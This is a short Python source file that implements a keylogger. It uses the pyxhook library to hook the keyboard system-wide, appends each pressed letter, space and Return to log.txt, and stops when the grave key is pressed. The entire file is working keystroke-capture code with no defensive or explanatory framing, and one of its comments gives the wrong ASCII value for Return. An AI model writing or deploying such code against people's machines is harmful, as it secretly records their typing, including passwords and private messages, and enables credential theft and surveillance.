import pyxhook
open('log.txt', 'w').close()
recordfile = "log.txt"
def keylogger():

	def OnKeyPress(event):
		recordKey = open(recordfile,"a")
		if event.Ascii==32: #32 is the ascii value of space
			recordKey.write(" ")
		elif event.Ascii==13: #10 is the ascii value of <Return>
			recordKey.write("\n")
	
		elif event.Ascii==96: #96 is the ascii value of the grave key (`)
			hook.cancel()
		elif event.Ascii >=65 and event.Ascii <=122:
			recordKey.write(event.Key)
		recordKey.close()

	#initiate HookManager class
	hook=pyxhook.HookManager()
	#listen to all keys pressed
	hook.KeyDown=OnKeyPress
	#hook the keyboard
	hook.HookKeyboard()
	#start the keylogging
	hook.start()
	return
